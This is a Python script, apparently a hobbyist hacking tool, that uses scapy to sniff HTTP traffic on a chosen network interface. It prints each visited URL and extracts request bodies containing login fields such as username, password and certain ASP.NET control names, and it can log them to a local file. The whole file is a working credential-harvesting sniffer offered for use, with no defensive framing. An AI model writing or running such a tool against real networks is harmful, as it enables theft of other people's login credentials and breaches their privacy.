import scapy.all as scapy
from scapy.layers import http
import urllib.parse
import os

def sniff(interface):
    scapy.sniff(iface=interface,prn=process_sniffed_packets)

def get_url(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        return url

def get_login_info(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keybword = ["usr", "uname", "username", "pwd", "pass", "password", "ctl00$CPHContainer$txtPassword", "ctl00$CPHContainer$txtUserLogin", "ctl00_CPHContainer_txtUserLogin", "ctl00_CPHContainer_txtPassword", "ctl00%24CPHContainer%24txtPassword", "ctl00%24CPHContainer%24txtUserLogin"]
            for eachword in keybword:
                if eachword.encode() in load:
                    return load


def process_sniffed_packets(packet):
    if y == 'Y' or y == 'y':
        sniffed = os.path.join(r"C:\Sniffer","captured.txt")
        if not os.path.exists(r"C:\Sniffer"):
            os.makedirs(r"C:\Sniffer")

    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))
        if y == 'Y' or y == 'y':
            sniffed = open(r"C:\Sniffer\captured.txt","a+")
            sniffed.write(f"{str(url)}\n")
            sniffed.close

        login_info = get_login_info(packet)
        if login_info:
            print("[+] Possible USERNAME And PASSWORD Captured")
            print("\t[x] USERNAME And PASSWORD >> " + urllib.parse.unquote(str(login_info)) + "\n\n")
            if y == 'Y' or y == 'y':
                sniffed = open(r"C:\Sniffer\captured.txt","a+")
                sniffed.write(f"{str(url)}  -  {urllib.parse.unquote(str(login_info))}\n")
                sniffed.close
            

x = input("\n[+]Enter The Interface To Sniff  - ")
global y
y = input("\n[+]Press Y/N To Store Captured Websites And Passwords  - ")
print(f"\n\n[+]Now Sniffing {x}\n")
sniff(x)
